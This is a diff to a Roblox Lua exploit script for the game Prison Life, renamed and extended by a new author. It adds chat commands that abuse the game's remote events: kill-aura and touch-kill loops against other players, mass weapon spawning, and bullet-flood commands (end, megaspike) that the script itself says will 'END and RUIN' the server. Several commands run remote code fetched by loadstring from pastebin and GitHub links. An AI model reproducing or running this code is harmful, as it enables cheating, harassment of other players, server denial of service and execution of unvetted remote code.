@@ -1,6 +1,6 @@
 
 	game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
-		Text = "Midnight's Admin By MidnightSnack_s & Catto#7713",
+		Text = "Original Script By Midnight#0004 Changes By onceuponatimeidk#1766",
 		Color = Color3.fromRGB(207, 96, 36)
 	})
 	game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
@@ -8,8 +8,18 @@
 		Color = Color3.fromRGB(207, 96, 36)
 	})
 	game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
-		Text = "Your Prefix Is Currently !",
+		Text = "Your Prefix Is Currently ! (enjoy)",
 		Color = Color3.fromRGB(207, 96, 36)
+	})
+	wait(0.8)
+	game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
+	Text = "Loaded Scripts (yes) (also a little reminder i am keeping prefix)",
+	Color = Color3.fromRGB(44, 101, 29)
+	})
+	wait(0.5)
+	game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
+	Text = "happy trollin cuh (thanks for using script)",
+	Color = Color3.fromRGB(9, 137, 207)
 	})
 
 	game:GetService("Players").LocalPlayer.PlayerGui.Home.fadeFrame.Visible = false
@@ -50,116 +60,133 @@
 			if msg:match(prefix .. "C Dark Red") then
 				loadchar("Crimson")
 				_G.CurrentColor = "Crimson"
-				ConsoleMessage("[Midnight's Admin] Your color is now Dark Red")
+				ConsoleMessage("[Color Changer] Your color is now Dark Red")
 			elseif msg:match(prefix .. "C Bright purple") then
 				loadchar("Bright purple")
 				_G.CurrentColor = "Bright purple"
-				ConsoleMessage("[Midnight's Admin] Your color is now Bright purple")
+				ConsoleMessage("[Color Changer] Your color is now Bright purple")
 			elseif msg:match(prefix .. "C Purple") then
 				loadchar("Eggplant")
 				_G.CurrentColor = "Eggplant"
-				ConsoleMessage("[Midnight's Admin] Your color is now Purple")
+				ConsoleMessage("[Color Changer] Your color is now Purple")
 			elseif msg:match(prefix .. "C Fawn brown") then
 				loadchar("Fawn brown")
 				_G.CurrentColor = "Fawn brown"
-				ConsoleMessage("[Midnight's Admin] Your color is now Fawn brown")
+				ConsoleMessage("[Color Changer] Your color is now Fawn brown")
 			elseif msg:match(prefix .. "C Mid gray") then
 				loadchar("Mid gray")
 				_G.CurrentColor = "Mid gray"
-				ConsoleMessage("[Midnight's Admin] Your color is now Mid gray")
+				ConsoleMessage("[Color Changer] Your color is now Mid gray")
 			elseif msg:match(prefix .. "C Hot pink") then
 				loadchar("Hot pink")
 				_G.CurrentColor = "Hot pink"
-				ConsoleMessage("[Midnight's Admin] Your color is now Hot pink")
+				ConsoleMessage("[Color Changer] Your color is now Hot pink")
 			elseif msg:match(prefix .. "C Teal") then
 				loadchar("Teal")
 				_G.CurrentColor = "Teal"
-				ConsoleMessage("[Midnight's Admin] Your color is now Teal")
+				ConsoleMessage("[Color Changer] Your color is now Teal")
 			elseif msg:match(prefix .. "C Pastel green") then
 				loadchar("Pastel green")
 				_G.CurrentColor = "Pastel green"
-				ConsoleMessage("[Midnight's Admin] Your color is now Pastel green")
+				ConsoleMessage("[Color Changer] Your color is now Pastel green")
 			elseif msg:match(prefix .. "C Dark taupe") then
 				loadchar("Dark taupe")
 				_G.CurrentColor = "Dark taupe"
-				ConsoleMessage("[Midnight's Admin] Your color is now Dark taupe")
+				ConsoleMessage("[Color Changer] Your color is now Dark taupe")
 			elseif msg:match(prefix .. "C Light red") then
 				loadchar("Light red")
 				_G.CurrentColor = "Light red"
-				ConsoleMessage("[Midnight's Admin] Your color is now Light red")
+				ConsoleMessage("[Color Changer] Your color is now Light red")
 			elseif msg:match(prefix .. "C Light purple") then
 				loadchar("Light purple")
 				_G.CurrentColor = "Light purple"
-				ConsoleMessage("[Midnight's Admin] Your color is now Light purple")
+				ConsoleMessage("[Color Changer] Your color is now Light purple")
 			elseif msg:match(prefix .. "C Fire Yellow") then
 				loadchar("Fire Yellow")
 				_G.CurrentColor = "Fire Yellow"
-				ConsoleMessage("[Midnight's Admin] Your color is now Fire Yellow")
+				ConsoleMessage("[Color Changer] Your color is now Fire Yellow")
 			elseif msg:match(prefix .. "C Camo") then
 				loadchar("Camo")
 				_G.CurrentColor = "Camo"
-				ConsoleMessage("[Midnight's Admin] Your color is now Camo")
+				ConsoleMessage("[Color Changer] Your color is now Camo")
 			elseif msg:match(prefix .. "C Light orange") then
 				loadchar("Light orange")
 				_G.CurrentColor = "Light orange"
-				ConsoleMessage("[Midnight's Admin] Your color is now Light orange")
+				ConsoleMessage("[Color Changer] Your color is now Light orange")
 			elseif msg:match(prefix .. "C Nougat") then
 				loadchar("Nougat")
 				_G.CurrentColor = "Nougat"
-				ConsoleMessage("[Midnight's Admin] Your color is now Nougat")
+				ConsoleMessage("[Color Changer] Your color is now Nougat")
 			elseif msg:match(prefix .. "C Toothpaste") then
 				loadchar("Toothpaste")
 				_G.CurrentColor = "Toothpaste"
-				ConsoleMessage("[Midnight's Admin] Your color is now Toothpaste")
+				ConsoleMessage("[Color Changer] Your color is now Toothpaste")
 			elseif msg:match(prefix .. "C Royal purple") then
 				loadchar("Royal purple")
 				_G.CurrentColor = "Royal purple"
-				ConsoleMessage("[Midnight's Admin] Your color is now Royal purple")
+				ConsoleMessage("[Color Changer] Your color is now Royal purple")
 			elseif msg:match(prefix .. "C Gold") then
 				loadchar("Gold")
 				_G.CurrentColor = "Gold"
-				ConsoleMessage("[Midnight's Admin] Your color is now Gold")
+				ConsoleMessage("[Color Changer] Your color is now Gold")
 			elseif msg:match(prefix .. "C Sunrise") then
 				loadchar("Sunrise")
 				_G.CurrentColor = "Sunrise"
-				ConsoleMessage("[Midnight's Admin] Your color is now Sunrise")
+				ConsoleMessage("[Color Changer] Your color is now Sunrise")
 			elseif msg:match(prefix .. "C Reddish lilac") then
 				loadchar("Reddish lilac")
 				_G.CurrentColor = "Reddish lilac"
-				ConsoleMessage("[Midnight's Admin] Your color is now Reddish lilac")
+				ConsoleMessage("[Color Changer] Your color is now Reddish lilac")
 			elseif msg:match(prefix .. "C Mint") then
 				loadchar("Mint")
 				_G.CurrentColor = "Mint"
-				ConsoleMessage("[Midnight's Admin] Your color is now Mint")
+				ConsoleMessage("[Color Changer] Your color is now Mint")
 			elseif msg:match(prefix .. "C Cyan") then
 				loadchar("Cyan")
 				_G.CurrentColor = "Cyan"
-				ConsoleMessage("[Midnight's Admin] Your color is now Cyan")
+				ConsoleMessage("[Color Changer] Your color is now Cyan")
 			elseif msg:match(prefix.."C Custom ") then
 				loadchar( msg:sub(11) )
-				ConsoleMessage("[Midnight's Admin] Custom color is " .. msg:sub(11) )
-			elseif msg:match(prefix .. "auto") then
-				_G.AutoEnabled = true
+				ConsoleMessage("[Color Changer] Custom color is " .. msg:sub(11) )
+			elseif msg:match(prefix .. "auto on") then
+_G.toggle = true
 
-				while wait() do
-					if _G.AutoEnabled then
-						local pos = LocalPlayer.Character.HumanoidRootPart.CFrame
+while _G.toggle == true do
+wait()
+local blah = (game.Players.LocalPlayer.Name)
 
-						if LocalPlayer.Character.Humanoid.Health == 0 then
-							wait(.2)
-							loadchar(_G.CurrentColor)
+      if game:GetService("Workspace")[blah].Humanoid.Health == 0 then
+	   saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+		local A_1 = "LocalPlayer"
 
-							LocalPlayer.Character.HumanoidRootPart.CFrame = pos
-						end
-					end
-				end
+local Event = game:GetService("Workspace").Remote.loadchar
+Event:InvokeServer(A_1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+end
+end
+			elseif msg:match(prefix .. "auto off") then
+_G.toggle = false
+
+while _G.toggle == true do
+wait()
+local blah = (game.Players.LocalPlayer.Name)
+
+      if game:GetService("Workspace")[blah].Humanoid.Health == 0 then
+	   saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+		local A_1 = "LocalPlayer"
+
+local Event = game:GetService("Workspace").Remote.loadchar
+Event:InvokeServer(A_1)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+end
+end
 			elseif msg:match(prefix .. "lguns on") then
                 _G.toggle = true
 
                 while _G.toggle == true do
                 wait()
                 game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
-                game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
+		game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
                 game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
                 game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
                 end
@@ -171,7 +198,7 @@
 		        Text = "(Shotty Only) Info: Don't Do ia or it wont work",
 		        Color = Color3.fromRGB(170, 170, 255)
 	            })
-	            local player = game:GetService("Players").LocalPlayer
+	        local player = game:GetService("Players").LocalPlayer
 
                 local gun = player.Backpack:FindFirstChild("Remington 870")
 
@@ -196,25 +223,27 @@
                 sM["AutoFire"] = true
         
 			elseif msg:match(prefix .. "ca") then
-			      local mouse = game.Players.LocalPlayer:GetMouse()
+		  local mouse = game.Players.LocalPlayer:GetMouse()
                   local arrestEvent = game.Workspace.Remote.arrest
                   mouse.Button1Down:connect(function()
                   local obj = mouse.Target
                   local response = arrestEvent:InvokeServer(obj)
                   end)
 			elseif msg:match(prefix .. "bulletspike") then
-		 local PackageSize = 1600 -- How many bullets is sent through in one remote call. Thanks Globals
-                 local SendPackageAmountOfTimes =  5 -- How many times the remote should be called.
+		 local PackageSize = 4700 -- How many bullets is sent through in one remote call. Thanks Globals
+                 local SendPackageAmountOfTimes =  6 -- How many times the remote should be called.
 
                  local ReplicatedStorage = game:GetService("ReplicatedStorage")
                  local Players = game:GetService("Players")
                  local LocalPlayer = Players.LocalPlayer
-
                  local ItemHandler = workspace:WaitForChild("Remote").ItemHandler
                  local ShootEvent = ReplicatedStorage:WaitForChild("ShootEvent")
 
                  ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
                  local Tool = Players.LocalPlayer.Backpack["Remington 870"]
+                 ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
+                 local Tool = Players.LocalPlayer.Backpack["M9"]
+		 ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
 
                  local Packet = {
                  RayObject = Ray.new(Vector3.new(-1, -1, -1), Vector3.new(1, 1, 1)),
@@ -234,8 +263,10 @@
     end
 			elseif msg:match(prefix .. "close") then
 				game:shutdown()
+			elseif msg:match(prefix .. "slayers") then
+				loadstring(game:HttpGet("https://raw.githubusercontent.com/Slayer35167/slayerandsionrepository/main/yus"))();
 			elseif msg:match(prefix .. "lguns off") then
-			    _G.toggle = false
+		_G.toggle = false
 
                 while _G.toggle == true do
                 wait()
@@ -245,9 +276,7 @@
                 game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
                 end
 			elseif msg:match(prefix .. "taze") then
-			    workspace.Remote.TeamEvent:FireServer("Bright blue")
-			    workspace.Remote.TeamEvent:FireServer("Medium Stone Grey")
-
+		workspace.Remote.TeamEvent:FireServer("Bright blue")
                 function kill(a)
                 local A_1 = 
                 {
@@ -271,8 +300,8 @@
                 end
                 
 			
-			elseif msg:match(prefix .. "FE Drill") then
-			    workspace.Remote.TeamEvent:FireServer("Bright blue")
+			elseif msg:match(prefix .. "fe drill") then
+workspace.Remote.TeamEvent:FireServer("Bright blue")
 
 local toolamount = 80 -- How long the tornado is
 local tornadosize = 1 -- The size of how big the opening of the tornado is
@@ -319,9 +348,13 @@ local renderstepped = runservice.RenderStepped:Connect(function()
     end
     LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
     tempchar:Destroy()
-	         elseif msg:match(prefix .. "crash") then
-		 local PackageSize = 5000 -- How many bullets is sent through in one remote call. Thanks Globals
-                 local SendPackageAmountOfTimes =  6 -- How many times the remote should be called.
+	         elseif msg:match(prefix .. "end") then
+		    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
+		    Text = "(ALL GUNS) I CANT GUARANTEE YOUR EXPLOIT ITS SELF WONT CRASH OK? also use this carefully please this will (END and RUIN) the server ENJOY!",
+		    Color = Color3.fromRGB(124, 92, 70)
+	            })
+		 local PackageSize = 75000 -- How many bullets is sent through in one remote call. Thanks Globals
+                 local SendPackageAmountOfTimes =  11 -- How many times the remote should be called.
 
                  local ReplicatedStorage = game:GetService("ReplicatedStorage")
                  local Players = game:GetService("Players")
@@ -332,6 +365,12 @@ local renderstepped = runservice.RenderStepped:Connect(function()
 
                  ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
                  local Tool = Players.LocalPlayer.Backpack["Remington 870"]
+		 ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
+                 local Tool = Players.LocalPlayer.Backpack["M4A1"]
+		 ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
+                 local Tool = Players.LocalPlayer.Backpack["AK-47"]
+		 ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
+                 local Tool = Players.LocalPlayer.Backpack["M9"]
 
                  local Packet = {
                  RayObject = Ray.new(Vector3.new(-1, -1, -1), Vector3.new(1, 1, 1)),
@@ -349,22 +388,22 @@ local renderstepped = runservice.RenderStepped:Connect(function()
     for i = 1, SendPackageAmountOfTimes do
         ShootEvent:FireServer(Package, Tool)
     end
-			elseif msg:match(prefix .. "Team in") then
+			elseif msg:match(prefix .. "i") then
 				workspace.Remote.TeamEvent:FireServer("Bright orange")
-			elseif msg:match(prefix .. "Team Guards") then
+			elseif msg:match(prefix .. "g") then
 				workspace.Remote.TeamEvent:FireServer("Bright blue")
-			elseif msg:match(prefix .. "Team Neutral") then
+			elseif msg:match(prefix .. "n") then
 				workspace.Remote.TeamEvent:FireServer("Medium stone grey")
 			elseif msg:match(prefix .. "btools") then
 				local tool1   = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack)
 				tool1.BinType = "Hammer"
-			elseif msg:match(prefix .. "Team Crims") then
+			elseif msg:match(prefix .. "c") then
 				local pos2 = LocalPlayer.Character.HumanoidRootPart.CFrame
 				LocalPlayer.Character.HumanoidRootPart.CFrame =
 					CFrame.new(-920.510803, 92.2271957, 2138.27002, 0, 0, -1, 0, 1, 0, 1, 0, 0)
 				wait(.2)
 				LocalPlayer.Character.HumanoidRootPart.CFrame = pos2
-			elseif msg:match(prefix .. "k guards") then
+			elseif msg:match(prefix .. "k g") then
 				workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
 				function getPacketFromPlayer(tget)
 					return {
@@ -382,7 +421,7 @@ local renderstepped = runservice.RenderStepped:Connect(function()
 				end
 				local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
 				game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
-			elseif msg:match(prefix .. "k crims") then
+			elseif msg:match(prefix .. "k c") then
 				game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
 				function getPacketFromPlayer(tget)
 					return {
@@ -400,7 +439,7 @@ local renderstepped = runservice.RenderStepped:Connect(function()
 				end
 				local gun = game.Players.LocalPlayer.Backpack["Remington 870"]
 				game:GetService("ReplicatedStorage").ShootEvent:FireServer(arg1, gun)
-			elseif msg:match(prefix .. "k inmates") then
+			elseif msg:match(prefix .. "k i") then
 				game.Workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
 				function getPacketFromPlayer(tget)
 					return {
@@ -438,22 +477,26 @@ local renderstepped = runservice.RenderStepped:Connect(function()
 
 
 			elseif msg:match(prefix .. "megaspike") then
-				local PackageSize = 100000
-				local SendPackageAmountOfTimes = 500
+				local PackageSize = 50000
+				local SendPackageAmountOfTimes = 7
 
 				local ReplicatedStorage = game:GetService("ReplicatedStorage")
 				local Players = game:GetService("Players")
 				local LocalPlayer = Players.LocalPlayer
 
 				local ItemHandler = workspace:WaitForChild("Remote").ItemHandler
-				local ShootEvent = ReplicatedStorage:WaitForChild("ShootEvent")
+				game:GetService('ReplicatedStorage').ShootEvent:FireServer(arg1,gun)
 
+				ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
+				local Tool = Players.LocalPlayer.Backpack["AK-47"]
 				ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
 				local Tool = Players.LocalPlayer.Backpack["Remington 870"]
+				ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
+				local Tool = Players.LocalPlayer.Backpack["M9"]
 
 				local Packet = {
 					RayObject = Ray.new(Vector3.new(-1, -1, -1), Vector3.new(1, 1, 1)),
-					Distance = 2048,
+					Distance = 5000,
 					Cframe = CFrame.new(0, 0, 0),
 					Hit = workspace:FindFirstChildOfClass("Part")
 				}
@@ -467,7 +510,7 @@ local renderstepped = runservice.RenderStepped:Connect(function()
 				for i = 1, SendPackageAmountOfTimes do
 					ShootEvent:FireServer(Package, Tool)
 				end
-			elseif msg:match(prefix .. "respawn") then
+			elseif msg:match(prefix .. "re") then
 				loadchar()
 			elseif msg:match(prefix .. "tazeall") then
 		workspace.Remote.TeamEvent:FireServer("Bright blue")
@@ -496,9 +539,13 @@ local renderstepped = runservice.RenderStepped:Connect(function()
 
 			elseif msg:match(prefix .. "prefix ") then
 				prefix = (msg:sub(9))
-				ConsoleMessage("[Midnight's Admin] Your prefix is " .. msg:sub(9))
+				ConsoleMessage("[Edited Admin] Your prefix is " .. msg:sub(9))
 			elseif msg:match(prefix .. "sagui") then
+				loadstring(game:HttpGet("https://pastebin.com/raw/nu20tAZE"))()
+				wait(0.3)
 			    	loadstring(game:HttpGet("https://pastebin.com/raw/nu20tAZE"))()
+				wait(0.3)
+				loadstring(game:HttpGet("https://pastebin.com/raw/nu20tAZE"))()
 			elseif msg:match(prefix .. "fling") then
 			    --[[ 
                 R6 only
@@ -541,7 +588,7 @@ local renderstepped = runservice.RenderStepped:Connect(function()
 				end
 			elseif msg:match(prefix .. "noleg") then
 				LocalPlayer.Character["Right Leg"]:Destroy()
-			elseif msg:match(prefix .. "invisible") then
+			elseif msg:match(prefix .. "invis") then
 				local player = game.Players.LocalPlayer
 position     = player.Character.HumanoidRootPart.Position
 wait(0.1)
@@ -565,7 +612,7 @@ game.Players.LocalPlayer.Character.Head.face:Remove()
 			
 			elseif msg:match(prefix .. "adonis") then
 				loadstring(game:HttpGet("https://pastebin.com/raw/MQ3wc7Zq", true))()
-			elseif msg:match(prefix .. "keycard") then
+			elseif msg:match(prefix .. "kfc") then
 				local Remote = game.Workspace.Remote['ItemHandler']
  
 				local Arguments = {
@@ -574,8 +621,12 @@ game.Players.LocalPlayer.Character.Head.face:Remove()
  
 				Remote:InvokeServer(unpack(Arguments))
 				
-			    elseif msg:match(prefix .. "CA") then
-			        game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
+			    elseif msg:match(prefix .. "ca on") then
+_G.toggle = true
+
+while _G.toggle == true do
+wait()
+game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
  
 Text = ("click arrest on motha fucka go arrest :)");
  
@@ -591,8 +642,29 @@ FontSize = Enum.FontSize.Size24;
    local obj = mouse.Target
    local response = arrestEvent:InvokeServer(obj)
    end)
-			    elseif msg:match(prefix .. "AR All") then
-                    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
+			    elseif msg:match(prefix .. "ca off") then
+_G.toggle = false
+
+while _G.toggle == true do
+wait()
+game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
+ 
+Text = ("click arrest on motha fucka go arrest :)");
+ 
+Color = Color3.new(0,255,0);
+ 
+FontSize = Enum.FontSize.Size24;
+ 
+})
+ 
+     local mouse = game.Players.LocalPlayer:GetMouse()
+   local arrestEvent = game.Workspace.Remote.arrest
+   mouse.Button1Down:connect(function()
+   local obj = mouse.Target
+   local response = arrestEvent:InvokeServer(obj)
+   end)
+			    elseif msg:match(prefix .. "ar all") then
+game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
  
 Text = ("arresting idiots...");
  
@@ -616,10 +688,65 @@ local i = 10
     until i == 0
 end
 end
-			    elseif msg:match(prefix .. "KillAura") then
-                    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
+			    elseif msg:match(prefix .. "ka on") then
+_G.toggle = true
+
+while _G.toggle == true do
+wait()
+game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
  
-Text = ("Press E For Kill Aura");
+Text = ("E = KillAura");
+ 
+Color = Color3.new(255,0,0);
+ 
+FontSize = Enum.FontSize.Size24;
+ 
+})
+ 
+     plr = game:service'Players'.LocalPlayer
+char = plr.Character
+mouse = plr:GetMouse()
+on = false
+ 
+mouse.KeyDown:connect(function(key)
+  if key == "e" then
+      on = true
+  end
+end)
+ 
+mouse.KeyUp:connect(function(key)
+  if key == "e" then
+      on = false
+  end
+end)
+ 
+while wait(0.1) do
+  for i, b in pairs(game.Players:GetChildren()) do
+      if b.Name ~= plr.Name and not b:IsFriendsWith(plr.UserId) and on then
+          for i = 1, 10 do
+              game.ReplicatedStorage.meleeEvent:FireServer(b)
+          end
+      end
+  end
+end
+ 
+ 
+while true do
+ wait(0.01)
+ for i,v in pairs (game.Players:GetChildren()) do
+   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[v.Name].Character.HumanoidRootPart.CFrame
+   game.ReplicatedStorage.meleeEvent:FireServer(v.Name)
+   wait(.8)
+ end
+end
+			    elseif msg:match(prefix .. "ka off") then
+_G.toggle = false
+
+while _G.toggle == true do
+wait()
+game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
+ 
+Text = ("E = KillAura");
  
 Color = Color3.new(255,0,0);
  
@@ -667,7 +794,7 @@ end
                     loadstring(game:HttpGet("https://the-shed.xyz/roblox/scripts/ChatBypass", true))()
 			    elseif msg:match(prefix .. "barcodehub") then
 		game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
-		Text = "Barcodehub Continued By XxSoulTakerxX#1766 Credits To Barcode (Disabled On Discord Though)",
+		Text = "Barcodehub Continued By onceuponatimeidk#1766 Credits To Barcode (Disabled On Discord Though)",
 		Color = Color3.fromRGB(220, 188, 129)
 	    })
 	    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
@@ -799,6 +926,30 @@ PGB.Model.Parent = L
 				game.workspace.Prison_OuterWall.prison_wall.Parent = game.Lighting
 			elseif msg:match(prefix .. "outer off") then
 				game.Lighting.prison_wall.Parent = game.workspace.Prison_OuterWall
+			elseif msg:match(prefix .. "trees on") then
+				for i = 1,99 do
+   			        game.workspace.Trees.Parent = game.Lighting
+    				game.workspace.Prison_Trees.Parent = game.Lighting
+				end
+			elseif msg:match(prefix .. "trees off") then
+				for i = 1,99 do
+    				game.Lighting.Trees.Parent = workspace
+    				game.Lighting.Prison_Trees.Parent = workspace
+				end
+			elseif msg:match(prefix .. "tk") then
+    game.Players.LocalPlayer.Character.Torso.Touched:Connect(function(k)
+    if game.Players[k.Parent.Name] ~= nil then
+        repeat
+                local args = {
+                [1] = game:GetService("Players")[k.Parent.Name]
+                }
+                game:GetService("ReplicatedStorage").meleeEvent:FireServer(unpack(args))
+                game:GetService("RunService").RenderStepped:Wait()
+        until k.Parent.Humanoid.Health == 0
+    end
+end)
+			elseif msg:match(prefix .. "ltk") then
+				loadstring(game:HttpGet('https://pastebin.com/raw/x4qbirTD', true))()
 			elseif msg:match(prefix .. "rgb on") then
 _G.toggle = true
 
@@ -813,7 +964,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -824,7 +975,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -835,7 +986,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -846,7 +997,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -857,7 +1008,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -868,7 +1019,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -879,7 +1030,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -890,7 +1041,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -915,7 +1066,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -926,7 +1077,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -937,7 +1088,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -948,7 +1099,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -959,7 +1110,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -970,7 +1121,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -981,7 +1132,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -992,7 +1143,7 @@ local tbl_main =
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
 
-wait (0.6)
+wait(0.6)
 
 saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 local tbl_main = 
@@ -1002,8 +1153,52 @@ local tbl_main =
 }
 game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = saved
+
+wait(0.6)
+
+saved = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+local tbl_main = 
+{
+      game:GetService("Players").LocalPlayer, 
+      "Tr. Yellow"
+}
+game:GetService("Workspace").Remote.loadchar:InvokeServer(unpack(tbl_main))
